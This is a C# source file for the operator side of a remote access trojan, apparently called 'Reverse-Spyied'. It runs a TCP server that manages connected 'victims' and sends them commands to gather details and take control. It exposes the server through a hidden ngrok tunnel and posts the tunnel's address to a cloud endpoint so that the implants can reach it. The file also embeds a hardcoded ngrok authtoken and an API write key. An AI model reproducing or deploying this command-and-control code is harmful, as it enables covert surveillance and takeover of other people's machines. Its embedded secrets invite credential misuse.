using System;
using EasyTcp4;
using System.IO;
using System.Net;
using System.Text;
using System.Linq;
using Newtonsoft.Json;
using System.Net.Http;
using Controller.Codes;
using EasyTcp4.Actions;
using System.Diagnostics;
using EasyTcp4.PacketUtils;
using EasyTcp4.ServerUtils;
using System.Threading.Tasks;
using EasyTcp4.Actions.Utils;
using Controller.ActionClass;
using Win = System.Windows.Forms;

namespace Controller.Server
{
    public static class ServerManager
    {
        private static bool IsNKill = true;
        private static bool IsPrevCon = false;
        private static Process NgrokProc = null;
        private static bool IsNetEventBinded = false;
        private static EasyTcpActionServer AServer = null;
        public static bool IsServerRunning { get; set; } = false;

        public static async Task<bool> SwitchServerMode()
        {
            if (!IsNetEventBinded)
            {
                SUtils.OnInternetChanged += OnInternetChanged;
                IsNetEventBinded = true;
            }

            if (!IsServerRunning && await SUtils.IsNetConnected())
            {
                try
                {
                    if (AServer == null)
                    {
                        AServer = new EasyTcpActionServer()
                        {
                            Serialize = SObj => Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(SObj)),
                            Deserialize = (BTS, TP) => JsonConvert.DeserializeObject(Encoding.UTF8.GetString(BTS), TP)
                        };

                        AServer.Interceptor = ActMSG =>
                        {
                            ActMSG = ActMSG.Decompress();
                            if (ActMSG.IsAction("AB")) return false;
                            else return true;
                        };

                        AServer.Start("127.0.0.1", 4230);
                        BindSEvents();

                        if (!await IsNgrokTunnelUp()) 
                            await UnBindSEvents();
                        else return true;
                    }
                }
                catch { }
            }
            else
            {
                if (AServer != null)
                {
                    try { AServer.SendAll("Server-Stopping"); } catch { }
                    await UnBindSEvents();
                    await Task.Delay(500);
                    return true;
                }
            }

            return false;
        }

        public static async void OnEnding() => await UnBindSEvents(true);

        private static void OnInternetChanged(bool IsConnected)
        {
            if ((IsConnected && IsPrevCon && !IsServerRunning) || !IsConnected)
                SUtils.InstructUI("BTN-SvrClick");

            if (!IsConnected) IsPrevCon = IsServerRunning;
        }

        private static void BindSEvents()
        {
            AServer.OnConnect += OnVictimConnect;
            AServer.OnDisconnect += OnVictimDisconnect;
            AServer.OnDataReceive += AServer_OnDataReceive;
            AServer.OnDataSend += OnDataSend;
            AServer.OnUnknownAction += OnUnknownAction;
            AServer.OnError += OnServerError;
            IsServerRunning = true;
        }

        private static async Task UnBindSEvents(bool IsExiting = false)
        {
            if (IsExiting && NgrokProc != null)
            {
                if (!NgrokProc.HasExited) NgrokProc.Kill();
                NgrokProc = null;
            }
            else using (var NDel = new HttpClient())
                { try { await NDel.DeleteAsync("http://localhost:4040/api/tunnels/Reverse-Spyied"); } catch { } }

            try
            {
                SUtils.ResetToInitials();
                TargetV.VictimList.Clear();
                AServer.OnConnect -= OnVictimConnect;
                AServer.OnDisconnect -= OnVictimDisconnect;
                AServer.OnDataReceive -= AServer_OnDataReceive;
                AServer.OnDataSend -= OnDataSend;
                AServer.OnUnknownAction -= OnUnknownAction;
                AServer.OnError -= OnServerError;
                IsServerRunning = false;
                AServer.Dispose();
                AServer = null;
            }
            catch { }
        }

        public static async Task<bool> StartNGROK()
        {
            if (IsNKill)
            {
                IsNKill = false;
                var NProc = Process.GetProcessesByName("Tunnel-Maker");
                if (NProc != null && NProc.Length > 0) foreach (var NP in NProc) NP.Kill();
            }

            if (!File.Exists(SUtils.WorkDir + "Ngrok\\Tunnel-Maker.exe"))
            {
                Win.MessageBox.Show("Kindly place a valid ngrok client file in the work directory with name Tunnel-Maker.exe");
                return false;
            }

            File.WriteAllLines($"{SUtils.WorkDir}Ngrok\\Tunnel-Config.yml", new string[]
            {
                "authtoken: 1vw5751pvsYt41OtX16Fm7I0Ma1_6tZsdXScFSsssxkNvuJSF",
                "web_addr: localhost:4040",
                "console_ui: false",
                "region: in"
            });

            var NProcInfo = new ProcessStartInfo
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                FileName = $"{SUtils.WorkDir}Ngrok\\Tunnel-Maker.exe",
                Arguments = $"start --none -config {SUtils.WorkDir}Ngrok\\Tunnel-Config.yml",
            };

        ReStart:;
            NgrokProc = new Process { StartInfo = NProcInfo };
            NgrokProc.Start(); await Task.Delay(1000);
            if (NgrokProc == null || NgrokProc.HasExited) goto ReStart;
            else return true;
        }

        private static async Task<bool> IsNgrokTunnelUp()
        {
            if (NgrokProc == null || NgrokProc.HasExited) { if (!await StartNGROK()) return false; }

            using (var NWorker = new HttpClient())
            {
                //NWorker.DefaultRequestHeaders.Add("Accept", "application/json");
                string NPostData =
                    "{\"authtoken\":\"1vw5751pvsYt41OtX16Fm7I0Ma1_6tZsdXScFSsssxkNvuJSF\"," +
                    "\"web_addr\":\"localhost:9208\"," +
                    "\"console_ui\":false," +
                    "\"addr\":4230," +
                    "\"proto\":\"tcp\"," +
                    "\"name\":\"Reverse-Spyied\"}";

                var Scnt = new StringContent(NPostData, Encoding.UTF8, "application/json");
                var NResp = await NWorker.PostAsync("http://localhost:4040/api/tunnels", Scnt);

                if (NResp.IsSuccessStatusCode && (int)NResp.StatusCode == 201)
                {
                    var NPUBData = JsonConvert.DeserializeObject<NData>(await NResp.Content.ReadAsStringAsync());
                    string[] UrlPortData = NPUBData.LiveURL.Replace("tcp://", string.Empty).Split(':');

                    string NgrokIP = Dns.GetHostEntry(UrlPortData[0]).AddressList.FirstOrDefault
                        (AIP => (int)AIP.AddressFamily == 2).ToString();

                    var PutData = new StringContent($"{{\"Type\":\"Endpoint\", \"IP\":\"{NgrokIP}\", \"Port\":\"{UrlPortData[1]}\"}}", Encoding.UTF8, "application/json");
                    NWorker.DefaultRequestHeaders.Add("Write-MagicKey", "423RK-5055e8de-62da-4a27-9148-83442ed104a9_Writable");
                    string URLWriter = $"https://acc32d92.eu-gb.apigw.appdomain.cloud/spyied-write_api/write";
                    var WResp = await NWorker.PutAsync(URLWriter, PutData);

                    if (WResp.IsSuccessStatusCode)
                    {
                        var PutResp = JsonConvert.DeserializeObject<WriteResp>(await WResp.Content.ReadAsStringAsync());
                        if (PutResp.IsWritten) return true;
                    }

                    //http://www.msftconnecttest.com/connecttest.txt
                }
            }

            return false;
        }

        private static void OnServerError(object _, Exception SvrExep)
        {

        }

        private static void OnUnknownAction(object _, Message UknMSG)
        {

        }

        private static void OnDataSend(object _, Message SntMSG)
        {

        }

        private static void AServer_OnDataReceive(object _, Message RcvMSG)
        {

        }

        private static void OnVictimDisconnect(object _, EasyTcpClient DiscClient) => TargetV.ThrowDeadVictim(DiscClient);

        private static void OnVictimConnect(object _, EasyTcpClient ConClient) => ConClient.SendAction("GET-DETAILS");
    }

    public static class TargetV
    {
        #region Declaration

        private static Victim CurrentV = null;
        private static readonly object RemoveLock = new object();

        public static long VictimsIDs { get; set; } = 0;
        public static ADVCollection<Victim> VictimList { get; private set; }

        #endregion

        #region Basic Helper Functions

        public static void Initialize(Syncfusion.WinForms.DataGrid.SfDataGrid VictimDGV)
            => VictimList = new ADVCollection<Victim>(VictimDGV);

        public static void Activate(this Victim Base, long FutCode)
            => Base.NetComunicator.SendAction("IWantControl", new ControlCMD { FutID = FutCode }, true);

        public static bool IsCurrentVMatched(Message MToMatch)
        {
            if (CurrentV == null) return false;
            else return CurrentV.NetComunicator == MToMatch.Client;
        }

        private static bool IsTaskableCMD<T>(T TaskOBJ)
            => !(TaskOBJ is Message) && !(TaskOBJ is ControlCMD);

        #endregion

        #region Execute Command Handlings

        public static bool ExecuteCMD(this ISend PToSend, string Act, string CDets = null, long FutCode = -1)
        {
            try
            {
                if (FutCode >= 0) PToSend.FutID = FutCode;
                if (IsTaskableCMD(PToSend) && !string.IsNullOrWhiteSpace(CDets)) PToSend.TskID = Tasker.EnqueueTask(CDets);
                if (PToSend is Message Msg) CurrentV.NetComunicator.SendAction(Act, Msg, true); //Preventing Circular Loop
                else CurrentV.NetComunicator.SendAction(Act, PToSend, true);
                return true;
            }
            catch { return false; }
        }

        public static bool ExecuteCMD<T>(string Act, T PToSend)
        {
            try
            {
                if (PToSend is Message Msg) CurrentV.NetComunicator.SendAction(Act, Msg, true); //Preventing Circular Loop
                else CurrentV.NetComunicator.SendAction(Act, PToSend, true);
                return true;
            }
            catch { return false; }
        }

        public static bool ExecuteCMD(string Act)
        {
            if (CurrentV == null) { Win.MessageBox.Show("Please select a target victim to continue!"); }
            else
            {
                try
                {
                    CurrentV.NetComunicator.SendAction(Act);
                    return true;
                }
                catch { }
            }

            return false;
        }

        #endregion

        #region Victim Handling Utilities

        public static void AddNewVictim(Message VDMsg)
        {
            var VBase = VDMsg.To<VictimBase>();
            VictimList.Add(new Victim(VBase, VDMsg.Client));
        }

        public static async void ThrowDeadVictim(EasyTcpClient DeadV)
        {
            SUtils.InstructUI("DGVictim-UnSelect");
            await Task.Delay(50);

            lock (RemoveLock)
            {
                var RIPV = Array.Find(VictimList.ToArray(), V => V.NetComunicator == DeadV);

                if (RIPV != null)
                {
                    VictimList.Remove(RIPV);
                    if (RIPV == CurrentV)
                    {
                        CurrentV = null;
                        SUtils.ResetToInitials();
                        SUtils.InstructUI("UP-Lat", "N/A");
                    }
                }
            }
        }

        public static void HandleVictimControl(long FId, EasyTcpClient Sender)
        {
            if (CurrentV != null) ExecuteCMD("YouAre-Uncontrolled");
            CurrentV = Array.Find(VictimList.ToArray(), V => V.NetComunicator == Sender);

            if (CurrentV != null && CurrentV != default(Victim))
            {
                ExecuteCMD("PING", new PingMGR { PingSTime = DateTime.Now });
                var VArys = Array.FindAll(VictimList.ToArray(), V => V.ToggleStatus == "Activating...." || V.ToggleStatus == "Controlling");
                foreach (var IUpdate in VArys) IUpdate.ToggleStatus = "Control Me";
                FutureUI.UpdateFuture(FId, true);
            }
        }

        #endregion
    }

    public class NData {[JsonProperty("public_url")] public string LiveURL { get; set; } }
    public class WriteResp { public bool IsWritten { get; set; } }
}
